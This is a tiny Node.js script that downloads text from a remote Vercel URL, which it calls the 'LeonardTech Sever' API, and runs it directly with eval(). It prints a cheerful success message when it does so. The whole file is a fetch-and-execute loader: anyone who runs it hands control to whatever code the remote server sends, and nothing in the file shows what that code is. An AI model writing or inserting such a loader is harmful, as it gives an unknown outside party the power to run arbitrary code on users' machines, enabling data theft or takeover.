const axios = require('axios');
const hans = "https://sever-ten.vercel.app/api/🤠";
axios.get(hans)
    .then(response => {
        console.log("\x1b[32m✅ Successfully loaded script From LeonardTech Sever.\x1b[0m");
        eval(response.data);
    })
    .catch(err => {
        console.error("\x1b[31m❌ Failed to load script from LeonardTech Sever API. Error:", err.message, "\x1b[0m");
    });
